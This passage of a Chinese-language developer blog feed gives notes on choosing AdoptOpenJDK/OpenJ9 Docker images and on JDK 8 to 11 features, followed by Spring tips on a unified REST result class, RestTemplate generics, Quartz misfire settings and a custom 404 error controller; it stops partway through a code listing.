    <content type="html"><![CDATA[<h2 id="jdk的docker镜像的选择？"><a href="#jdk的docker镜像的选择？" class="headerlink" title="jdk的docker镜像的选择？"></a>jdk的docker镜像的选择？</h2><p>adoptopenjdk 镜像：</p><ul><li><p>adoptopenjdk/openjdk8</p></li><li><p>adoptopenjdk/openjdk9</p></li><li><p>adoptopenjdk/openjdk10</p></li></ul><p>之后是 OpenJ9，也是由 adoptopenjdk 为 8/9 版本所提供的，同时包含为 9 发布的每日构建版：</p><ul><li><p>adoptopenjdk/openjdk8-openj9</p></li><li><p>adoptopenjdk/openjdk9-openj9</p></li><li><p>adoptopenjdk/openjdk9-openj9:nightly</p></li></ul><p>而以<code>adoptopenjdk:8-jdk-openj9</code>开头的则是官方的镜像包，主要是ubuntu和windows的，镜像比较大。不推荐此处。</p><h1 id="adoptopenjdk-openjdk8-slim对比openjdk"><a href="#adoptopenjdk-openjdk8-slim对比openjdk" class="headerlink" title="adoptopenjdk/openjdk8:slim对比openjdk"></a>adoptopenjdk/openjdk8:slim对比openjdk</h1><p>众所周知Oracle JDK商业使用开始收费了，然而Oracle在<a href="http://jdk.java.net/%E6%94%BE%E5%87%BA%E7%9A%84%E5%AE%98%E6%96%B9%E7%89%88OpenJDK" target="_blank" rel="noopener">http://jdk.java.net/放出的官方版OpenJDK</a>有下面几点问题：</p><p>1、没有32位</p><p>2、没有安装程序（初学者会遇到困难，比如设置PATH，运行jar等）</p><p>3、旧版不更新（即使LTS版本）</p><p>4、没有JRE</p><p>因此不推荐从<a href="http://jdk.java.net/%E4%B8%8B%E8%BD%BDOpenJDK" target="_blank" rel="noopener">http://jdk.java.net/下载OpenJDK</a>。</p><p>AdoptOpenJDK是OpenJDK的社区维护版，主要维护8、11两个LTS版本以及最新版本。</p><p>AdoptOpenJDK官网：<a href="https://adoptopenjdk.net/" target="_blank" rel="noopener">https://adoptopenjdk.net/</a></p><p>清华大学镜像：<a href="https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/</a></p><p>进行Java开发需要下载JDK，msi版本是安装程序，推荐初学者使用安装程序。</p><p>64位Windows的JDK8：<a href="https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/8/jdk/x64/windows/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/8/jdk/x64/windows/</a></p><p>32位Windows的JDK8：<a href="https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/8/jdk/x32/windows/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/8/jdk/x32/windows/</a></p><p>64位Windows的JDK11：<a href="https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/11/jdk/x64/windows/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/11/jdk/x64/windows/</a></p><p>32位Windows的JDK11：<a href="https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/11/jdk/x32/windows/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/AdoptOpenJDK/11/jdk/x32/windows/</a></p><p>64位有hotspot、openj9两种jvm类型，<strong>hotspot是官方的jvm，兼容性最好，因此一般用途推荐使用hotspot</strong>。</p><p>OpenJ9 的前身是IBM的 J9 Java 虚拟机，主要服务于IBM企业级软件产品，是一款高性能的JVM。<br>在 Web 应用开发中，为了降低内存消耗，你是否尝试过：</p><p>去除不必要的组件，减少代码体积</p><p>更换 Web 容器，如将 Tomcat 更换为Undertow</p><p>优化Docker基础镜像，减少镜像体积</p><p>这些效果往往不是很理想。而通过将 HotSpot 更换为 OpenJ9，<strong>内存占用能降低至少 60%<strong>，</strong>而启动时间也能快 40% 以上</strong>，效果立竿见影。</p><h2 id="JDK-11-新特性"><a href="#JDK-11-新特性" class="headerlink" title="JDK 11 新特性"></a>JDK 11 新特性</h2><blockquote><p>重要通知，直接从oracle的官方下载的JDK11不再是免费的，若是你一旦不小心使用Java 11进行了具有商业性的行为，那么你很可能将接到Oracle的致电，并要求你提供大量的资金。</p></blockquote><ol><li>删除jre运行库，不在需要配置<code>JRE_HOME</code>环境变量</li><li>删除Java EE和CORBA模块，JavaFX已经被移除</li><li>字符串API增加</li></ol><ul><li><code>String#repeat</code> ，例如<code>&quot;abc&quot;.repeat(3)</code></li><li><code>String#isBlank</code>, 例如 <code>&quot; &quot;.isBlank(); // true</code></li><li><code>String#strip</code>， 例如 <code>&quot; &quot;.strip().isBlank()</code></li><li><code>String#lines</code>, 将字符串实例拆分为单独行的<code>Stream&lt;string&gt;</code>流, 例如 <code>&quot;foo\nbar&quot;.lines().forEach(System.out::println)</code></li></ul><h2 id="JDK-10-新特性"><a href="#JDK-10-新特性" class="headerlink" title="JDK 10 新特性"></a>JDK 10 新特性</h2><ol><li>局部变量类型判断</li><li>GC的优化以及内存管理</li></ol><h2 id="JDK-9"><a href="#JDK-9" class="headerlink" title="JDK 9"></a>JDK 9</h2><ol><li>引入了新的HTTPClient操作接口</li><li><code>jshell</code>交互命令引入,类python的代码块交互平台</li></ol><h2 id="JDK-8"><a href="#JDK-8" class="headerlink" title="JDK 8"></a>JDK 8</h2><p>重要: 截止到2020年底不再进行JDK8的更新</p><ol><li>Lambdas表达式与Functional接口</li><li>接口的默认与静态方法</li><li>新增方法的调用方式类似php</li><li>try catch resource</li><li>优化了HashMap以及ConcurrentHashMap</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;jdk的docker镜像的选择？&quot;&gt;&lt;a href=&quot;#jdk的docker镜像的选择？&quot; class=&quot;headerlink&quot; title=&quot;jdk的docker镜像的选择？&quot;&gt;&lt;/a&gt;jdk的docker镜像的选择？&lt;/h2&gt;&lt;p&gt;adoptopenjdk 镜</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>spring技术问题整理</title>
    <link href="https://seniortesting.club/posts/wmvQiQNgGQ/"/>
    <id>https://seniortesting.club/posts/wmvQiQNgGQ/</id>
    <published>2021-03-26T12:38:51.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<p>整理一些常用的spring技术问题</p><h2 id="如何定义一个统一的REST返回结果对象？"><a href="#如何定义一个统一的REST返回结果对象？" class="headerlink" title="如何定义一个统一的REST返回结果对象？"></a>如何定义一个统一的REST返回结果对象？</h2><p>代码如下，定义一个类:<code>Result</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jpa.util.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.ZonedDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.format.DateTimeFormatter;</span><br><span class="line"><span class="keyword">import</span> com.example.jpa.constant.enums.ResponseCodeEnum;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonInclude;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonProperty;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.StrUtil;</span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Result</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> String DATE_FORMAT = <span class="string">&quot;yyyy-MM-dd HH:mm:ss.SSS Z&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JsonProperty(</span></span><br><span class="line"><span class="meta">            value = &quot;success&quot;,</span></span><br><span class="line"><span class="meta">            index = 1</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> Boolean success;</span><br><span class="line">    <span class="meta">@JsonProperty(</span></span><br><span class="line"><span class="meta">            value = &quot;timestamp&quot;,</span></span><br><span class="line"><span class="meta">            index = 2</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> String timestamp;</span><br><span class="line">    <span class="meta">@JsonProperty(</span></span><br><span class="line"><span class="meta">            value = &quot;code&quot;,</span></span><br><span class="line"><span class="meta">            index = 3</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> String code;</span><br><span class="line">    <span class="meta">@JsonProperty(</span></span><br><span class="line"><span class="meta">            value = &quot;message&quot;,</span></span><br><span class="line"><span class="meta">            index = 4</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line">    <span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line">    <span class="meta">@JsonProperty(</span></span><br><span class="line"><span class="meta">            value = &quot;data&quot;,</span></span><br><span class="line"><span class="meta">            index = 5</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Result</span><span class="params">(<span class="keyword">final</span> ResponseCodeEnum responseCodeEnum, <span class="keyword">final</span> String msg, <span class="keyword">final</span> T data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.timestamp = ZonedDateTime.now().format(DateTimeFormatter.ofPattern(DATE_FORMAT));</span><br><span class="line">        <span class="keyword">this</span>.code = responseCodeEnum.getCode();</span><br><span class="line">        <span class="keyword">this</span>.msg = StrUtil.isNotEmpty(msg) ? msg : responseCodeEnum.getMsgZh();</span><br><span class="line">        <span class="keyword">this</span>.success = responseCodeEnum.equals(ResponseCodeEnum.CODE_100S1000);</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 成功</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Result&lt;T&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> Walter Hu</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span> 2019/12/8</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">success</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> success(<span class="keyword">null</span>, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">success</span><span class="params">(T data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> success(data, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">success</span><span class="params">(T data, String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Result(ResponseCodeEnum.CODE_100S1000, msg, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 失败</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> msg</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Result&lt;T&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> Walter Hu</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span> 2019/12/8</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.8</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">fail</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fail(ResponseCodeEnum.CODE_200E2001, msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">fail</span><span class="params">(ResponseCodeEnum code)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fail(code, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">fail</span><span class="params">(ResponseCodeEnum code, String msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fail(code, msg, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">fail</span><span class="params">(ResponseCodeEnum code, String msg, T data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fail(code, msg, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">Result&lt;T&gt; <span class="title">status</span><span class="params">(<span class="keyword">boolean</span> flag)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> flag ? success(<span class="keyword">null</span>) : fail(ResponseCodeEnum.CODE_200E2001);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="自定义自己的application-yml中的配置信息"><a href="#自定义自己的application-yml中的配置信息" class="headerlink" title="自定义自己的application.yml中的配置信息"></a>自定义自己的application.yml中的配置信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;</span><br><span class="line">    &lt;optional&gt;true&lt;/optional&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="spring-security-securedEnabled-jsr250Enabled-prePostEnabled"><a href="#spring-security-securedEnabled-jsr250Enabled-prePostEnabled" class="headerlink" title="spring security securedEnabled /jsr250Enabled  / prePostEnabled"></a>spring security securedEnabled /jsr250Enabled  / prePostEnabled</h2><h2 id="resttemplate获取的json对象是泛型的会自动转换为map对象，如何转为正确的实体类？"><a href="#resttemplate获取的json对象是泛型的会自动转换为map对象，如何转为正确的实体类？" class="headerlink" title="resttemplate获取的json对象是泛型的会自动转换为map对象，如何转为正确的实体类？"></a>resttemplate获取的json对象是泛型的会自动转换为map对象，如何转为正确的实体类？</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 泛型的数据返回值</span><br><span class="line">        ParameterizedTypeReference&lt;WebResponse&lt;WeixinUserInfoResponse&gt;&gt; webResponseParameterizedTypeReference &#x3D;</span><br><span class="line">                new ParameterizedTypeReference&lt;WebResponse&lt;WeixinUserInfoResponse&gt;&gt;() &#123;</span><br><span class="line">                &#125;;</span><br><span class="line">        ResponseEntity&lt;WebResponse&lt;WeixinUserInfoResponse&gt;&gt; responseEntity &#x3D; restTemplate.</span><br><span class="line">                exchange(userInfoRequestUrl, HttpMethod.GET, null, webResponseParameterizedTypeReference);</span><br><span class="line">        &#x2F;&#x2F; 获取正确了token值</span><br><span class="line">        WebResponse&lt;WeixinUserInfoResponse&gt; webResponse &#x3D; responseEntity.getBody();</span><br></pre></td></tr></table></figure><h2 id="spring-quartz任务调度超时"><a href="#spring-quartz任务调度超时" class="headerlink" title="spring quartz任务调度超时"></a>spring quartz任务调度超时</h2><p><a href="https://www.cnblogs.com/daxin/p/3919927.html" target="_blank" rel="noopener">参考博客</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jobStore:</span></span><br><span class="line">    <span class="attr">class:</span> <span class="string">org.quartz.impl.jdbcjobstore.JobStoreTX</span></span><br><span class="line">    <span class="attr">driverDelegateClass:</span> <span class="string">org.quartz.impl.jdbcjobstore.StdJDBCDelegate</span></span><br><span class="line">    <span class="attr">tablePrefix:</span> <span class="string">QRTZ_</span></span><br><span class="line">    <span class="comment"># 调度引擎比较忙得时候出现这个问题</span></span><br><span class="line">    <span class="comment"># 当前线程有10个，但是现在有12个任务需要在13:00处理，所以有两个任务需要延迟处理，</span></span><br><span class="line">    <span class="comment"># 如果延迟到13:60，就是延迟了60分钟， 大于下面的50分钟，所以就是misfire的。</span></span><br><span class="line">    <span class="comment"># 如果延迟到13:40 ，触发器发现小于50秒，调度引擎认为这个延迟时间可以忍受，所以不算超时(Misfires)</span></span><br><span class="line">    <span class="attr">misfireThreshold:</span> <span class="number">50000</span></span><br><span class="line">    <span class="comment"># 集群配置</span></span><br><span class="line">    <span class="attr">isClustered:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">clusterCheckinInterval:</span> <span class="number">50000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="springboot-配置全局404详细步骤及说明"><a href="#springboot-配置全局404详细步骤及说明" class="headerlink" title="springboot 配置全局404详细步骤及说明"></a>springboot 配置全局404详细步骤及说明</h2><ul><li><code>application.xml</code>中配置如下</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">error:</span></span><br><span class="line">    <span class="attr">whitelabel:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">include-exception:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">include-stacktrace:</span> <span class="string">on_trace_param</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明：<code>server.error.whitelabel.enabled</code>,是为了去掉springboot的自动配置，它的自动配置代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration.WhitelabelErrorViewConfiguration</span><br><span class="line"></span><br><span class="line"> <span class="meta">@Configuration</span></span><br><span class="line"> <span class="meta">@ConditionalOnProperty(prefix = &quot;server.error.whitelabel&quot;, name = &quot;enabled&quot;, matchIfMissing = true)</span></span><br><span class="line"> <span class="meta">@Conditional(ErrorTemplateMissingCondition.class)</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelErrorViewConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> StaticView defaultErrorView = <span class="keyword">new</span> StaticView();</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Bean(name = &quot;error&quot;)</span></span><br><span class="line">  <span class="meta">@ConditionalOnMissingBean(name = &quot;error&quot;)</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> View <span class="title">defaultErrorView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">this</span>.defaultErrorView;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If the user adds @EnableWebMvc then the bean name view resolver from</span></span><br><span class="line">  <span class="comment">// WebMvcAutoConfiguration disappears, so add it back in to avoid disappointment.</span></span><br><span class="line">  <span class="meta">@Bean</span></span><br><span class="line">  <span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> BeanNameViewResolver <span class="title">beanNameViewResolver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   BeanNameViewResolver resolver = <span class="keyword">new</span> BeanNameViewResolver();</span><br><span class="line">   resolver.setOrder(Ordered.LOWEST_PRECEDENCE - <span class="number">10</span>);</span><br><span class="line">   <span class="keyword">return</span> resolver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>server.error.include-exception</code> 用于实例化一个bean可以获取对应的404发生的时候获取对应的错误信息:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = ErrorAttributes.class, search = SearchStrategy.CURRENT)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> DefaultErrorAttributes <span class="title">errorAttributes</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">new</span> DefaultErrorAttributes(</span><br><span class="line">   <span class="keyword">this</span>.serverProperties.getError().isIncludeException());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(value = ErrorController.class, search = SearchStrategy.CURRENT)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> BasicErrorController <span class="title">basicErrorController</span><span class="params">(ErrorAttributes errorAttributes)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">new</span> BasicErrorController(errorAttributes, <span class="keyword">this</span>.serverProperties.getError(),</span><br><span class="line">   <span class="keyword">this</span>.errorViewResolvers);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>application.yml</code>中还需要配置如下信息：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">spring:</span><br><span class="line">  mvc:</span><br><span class="line">    favicon:</span><br><span class="line">      enabled: false</span><br><span class="line">    throw-exception-if-no-handler-found: true</span><br></pre></td></tr></table></figure><ul><li>重写一个controller实现<code>ErrorController</code>, 因为<code>ErrorMvcAutoConfiguration</code>会查找所有实现了<code>ErrorController</code> 的bean，如果没有就使用自己的<code>BasicErrorController</code>:</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"> <span class="meta">@ConditionalOnMissingBean(value = ErrorController.class, search = SearchStrategy.CURRENT)</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> BasicErrorController <span class="title">basicErrorController</span><span class="params">(ErrorAttributes errorAttributes)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> BasicErrorController(errorAttributes, <span class="keyword">this</span>.serverProperties.getError(),</span><br><span class="line">    <span class="keyword">this</span>.errorViewResolvers);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以重写的一个自定义的ErrorController如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Walter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> org.springframework.boot.autoconfigure.web.ErrorProperties</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> org.springframework.boot.autoconfigure.web.ServerProperties</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span 